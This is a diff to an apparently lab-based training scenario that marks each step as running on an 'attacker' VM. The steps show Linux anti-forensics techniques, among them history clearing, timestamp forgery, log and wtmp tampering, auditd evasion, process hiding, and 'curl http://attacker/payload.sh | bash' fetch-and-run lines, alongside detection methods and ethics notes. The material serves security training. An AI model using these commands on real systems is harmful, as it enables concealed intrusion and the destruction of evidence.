@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: Forensic Artifacts
     field: stdout
+  target_vm: attacker
   script: echo '=== Forensic Artifacts ===' && echo '[Bash History]' && wc -l ~/.bash_history 2>/dev/null && echo '[Login Records]' && last -5 2>/dev/null && echo '[Auth Log]' && tail -3 /var/log/auth.log
     2>/dev/null && echo '[Syslog]' && tail -3 /var/log/syslog 2>/dev/null && echo '[File Timestamps]' && stat ~/.bashrc | grep -E '(Access|Modify|Change)'
   risk_level: low
@@ -40,6 +41,7 @@ steps:
     type: output_contains
     expect: History Manipulation
     field: stdout
+  target_vm: attacker
   script: echo '=== History Manipulation ===' && echo 'Current HISTFILE:' $HISTFILE && echo 'Current HISTSIZE:' $HISTSIZE && echo '' && echo 'Disable history for session:' && echo 'unset HISTFILE' && echo
     'export HISTSIZE=0' && echo 'set +o history' && echo '' && echo 'Delete specific entry:' && echo 'history -d <line_number>' && echo '' && echo 'Clear all history:' && echo 'history -c && history -w'
     && echo '' && echo 'Prevent future logging:' && echo 'ln -sf /dev/null ~/.bash_history'
@@ -57,6 +59,7 @@ steps:
     type: output_contains
     expect: timestamp manipulation
     field: stdout
+  target_vm: attacker
   script: 'echo ''test'' > /tmp/antiforensic_test.txt && echo ''Before:'' && stat /tmp/antiforensic_test.txt | grep -E ''(Access|Modify|Change)'' && touch -t 202301010000 /tmp/antiforensic_test.txt && echo
     ''After timestamp manipulation:'' && stat /tmp/antiforensic_test.txt | grep -E ''(Access|Modify|Change)'' && echo '''' && echo ''Note: Change time (ctime) cannot be set by touch'' && echo ''Forensic
     detection: ctime newer than mtime indicates tampering'''
@@ -75,6 +78,7 @@ steps:
     type: output_contains
     expect: Log Tampering
     field: stdout
+  target_vm: attacker
   script: cp /var/log/syslog /tmp/syslog_copy 2>/dev/null || echo 'test log line with 10.20.30.201' > /tmp/syslog_copy && echo 'test normal log line' >> /tmp/syslog_copy && echo 'Before:' && wc -l /tmp/syslog_copy
     && echo '' && sed -i '/10.20.30.201/d' /tmp/syslog_copy && echo 'After removing attacker IP lines:' && wc -l /tmp/syslog_copy && echo '' && echo '=== Log Tampering Techniques ===' && echo '1. sed -i
     "/pattern/d" logfile - Remove matching lines' && echo '2. > logfile - Truncate file (preserves inode)' && echo '3. shred -u logfile - Secure delete' && echo '4. logrotate manipulation - Force early
@@ -95,6 +99,7 @@ steps:
     type: output_contains
     expect: Fileless Attack
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Fileless Attack Techniques ==='' && echo '''' && echo ''[1] Download and Execute in Memory'' && echo ''curl -s http://attacker/payload.sh | bash'' && echo ''wget -qO- http://attacker/payload.py
     | python3'' && echo '''' && echo ''[2] Memory-only execution'' && echo ''python3 -c "import os; os.system(\"id\")"'' && echo '''' && echo ''[3] tmpfs/ramfs (no disk touch)'' && ls -la /dev/shm/ | head
     -5 && echo ''Files in /dev/shm are in RAM only'' && echo '''' && echo ''[4] Process injection'' && echo ''/proc/<pid>/mem write (ptrace)'' && echo '''' && echo ''[5] Living off the Land (LOLBins)''
@@ -113,6 +118,7 @@ steps:
     type: output_contains
     expect: Secure Deletion
     field: stdout
+  target_vm: attacker
   script: 'echo ''sensitive data'' > /tmp/secure_del_test.txt && echo ''Before shred:'' && cat /tmp/secure_del_test.txt && shred -vfz -n 3 /tmp/secure_del_test.txt 2>&1 && echo ''---'' && echo ''=== Secure
     Deletion Methods ==='' && echo ''1. shred -n 3 file: 3-pass overwrite + zero fill'' && echo ''2. dd if=/dev/urandom of=file bs=1M: Random data overwrite'' && echo ''3. wipe -f file: Gutmann 35-pass
     method'' && echo '''' && echo ''SSD Note: Secure delete unreliable on SSDs (wear leveling)'' && echo ''Encryption is more reliable: encrypt before delete'' && rm -f /tmp/secure_del_test.txt'
@@ -131,6 +137,7 @@ steps:
     type: output_contains
     expect: Login Record
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Login Record Manipulation ==='' && echo ''[Current records]'' && last -5 2>/dev/null && echo '''' && echo ''[utmpdump - convert binary to text]'' && utmpdump /var/run/utmp 2>/dev/null
     | head -5 && echo '''' && echo ''[Manipulation methods]'' && echo ''1. utmpdump /var/log/wtmp > /tmp/wtmp.txt'' && echo ''   Edit text file, remove entries'' && echo ''   utmpdump -r < /tmp/wtmp.txt
     > /var/log/wtmp'' && echo '''' && echo ''2. logtamper tools: Remove specific login entries'' && echo '''' && echo ''3. Truncate: > /var/log/wtmp (erases all)'' && echo '''' && echo ''[Detection]'' &&
@@ -151,6 +158,7 @@ steps:
     type: output_contains
     expect: Process Hiding
     field: stdout
+  target_vm: attacker
   script: echo '=== Process Hiding Techniques ===' && echo '' && echo '[1] Process Name Manipulation' && echo 'exec -a "[kworker/0:1]" /tmp/malware (mimics kernel thread)' && echo 'prctl(PR_SET_NAME, "sshd")
     (programmatic rename)' && echo '' && echo '[2] LD_PRELOAD rootkit' && echo 'Intercept readdir() to hide /proc/<pid> entries' && echo 'ps, top, ls show normal output' && echo '' && echo '[3] Mount namespace'
     && echo 'unshare --mount /bin/bash' && echo 'Mount tmpfs over /proc/<pid> to hide process' && echo '' && echo '[4] Living off the Land' && echo 'Use legitimate process names and paths' && echo 'Inject
@@ -171,6 +179,7 @@ steps:
     type: output_contains
     expect: Auditd
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Auditd Analysis & Evasion ==='' && auditctl -l 2>/dev/null | head -10 || echo ''No audit rules configured'' && echo '''' && echo ''[Evasion Techniques]'' && echo ''1. auditctl -D:
     Delete all audit rules (requires root)'' && echo ''2. service auditd stop: Stop audit daemon'' && echo ''3. > /var/log/audit/audit.log: Truncate audit log'' && echo ''4. Use syscalls not monitored by
     audit rules'' && echo ''5. Operate during log rotation window'' && echo '''' && echo ''[Detection of Evasion]'' && echo ''- Monitor auditd service status'' && echo ''- Alert on audit rule changes (config_change
@@ -190,6 +199,7 @@ steps:
     type: output_contains
     expect: Disk Anti-Forensics
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Disk Anti-Forensics ===\n\n[1] Full Disk Encryption\n- LUKS/dm-crypt: Power-off = data inaccessible\n- BitLocker, FileVault: Same principle\n- Key in memory only while running\n\n[2]
     Journal Manipulation\n- ext4: tune2fs -O ^has_journal /dev/sdX\n- Clear journal: debugfs -w -R "feature -has_journal" /dev/sdX\n- Prevents file recovery from journal\n\n[3] Slack Space Filling\n- Fill
     unused disk space with random data\n- dd if=/dev/urandom of=/tmp/fill bs=1M; rm /tmp/fill\n- Prevents recovery of deleted files\n\n[4] Filesystem Timestamps\n- mount -o noatime: Disable access time
@@ -210,6 +220,7 @@ steps:
     type: output_contains
     expect: Network Anti-Forensics
     field: stdout
+  target_vm: attacker
   script: echo -e '=== Network Anti-Forensics ===\n\n[1] MAC Address Spoofing\nmacchanger -r eth0\n- Prevents physical device identification\n\n[2] Encrypted Communications\n- TLS/SSL for all C2 traffic\n-
     SSH tunnels for all operations\n- VPN for IP address hiding\n\n[3] Traffic Mixing\n- Operate during business hours\n- Match normal traffic patterns\n- Use common ports (80, 443)\n\n[4] Tor/Proxy Chains\n-
     proxychains4 tool command\n- Multi-hop anonymization\n\n[5] Packet Capture Evasion\n- Encrypt all traffic (prevent content analysis)\n- Fragment packets (prevent reassembly)\n- Use protocols not typically
@@ -231,6 +242,7 @@ steps:
     type: output_contains
     expect: Memory Forensics
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Memory Forensics & Evasion ===\n\n[Volatility Plugins]\n- pslist/psscan: Process listing (hidden process detection)\n- netscan: Network connections\n- malfind: Injected code detection\n-
     hashdump: Password hashes from memory\n- dumpfiles: Recover files from memory\n- cmdline: Command line arguments\n- envvars: Environment variables\n\n[Anti-Memory Forensics]\n1. Memory encryption: AMD
     SEV, Intel TME\n2. Reflective loading: No file on disk, PE headers wiped\n3. Module stomping: Overwrite legitimate module in memory\n4. Garble strings: Encrypt strings, decrypt on use\n5. Unhook: Remove
@@ -252,6 +264,7 @@ steps:
     type: output_contains
     expect: Anti-Forensics Detection
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Anti-Forensics Detection ===\n\n[Timestamp Manipulation]\n- ctime > mtime: touch cannot modify ctime\n- $MFT vs $STDINFO timestamp mismatch (NTFS)\n- Timeline gaps in file creation
     patterns\n\n[Log Tampering]\n- File size decrease without rotation\n- Gaps in sequential log entries\n- Remote log server comparison\n- auditd config_change events\n\n[Secure Deletion]\n- Journal entries
     for deleted files (ext4)\n- $MFT entries for deleted files (NTFS)\n- File system slack space analysis\n\n[Fileless Attacks]\n- Process memory analysis (Volatility malfind)\n- Sysmon process creation
@@ -273,6 +286,7 @@ steps:
     type: output_contains
     expect: Ethical Considerations
     field: stdout
+  target_vm: attacker
   script: 'rm -f /tmp/antiforensic_test.txt /tmp/syslog_copy 2>/dev/null && echo ''=== Ethical Considerations ==='' && echo '''' && echo ''[Legitimate Use]'' && echo ''- Red team engagement: Test forensic
     readiness'' && echo ''- Privacy protection: Personal data sanitization'' && echo ''- Compliance: Data destruction requirements (GDPR Art.17)'' && echo ''- Decommissioning: Secure device disposal'' &&
     echo '''' && echo ''[Illegitimate Use]'' && echo ''- Destroying evidence of criminal activity'' && echo ''- Obstruction of justice (legal violation)'' && echo ''- Covering tracks after data breach''
@@ -353,6 +367,7 @@ steps:
     type: output_contains
     expect: Forensic Readiness
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/forensic_readiness.txt << ''EOF''
 
     === Forensic Readiness Checklist ===
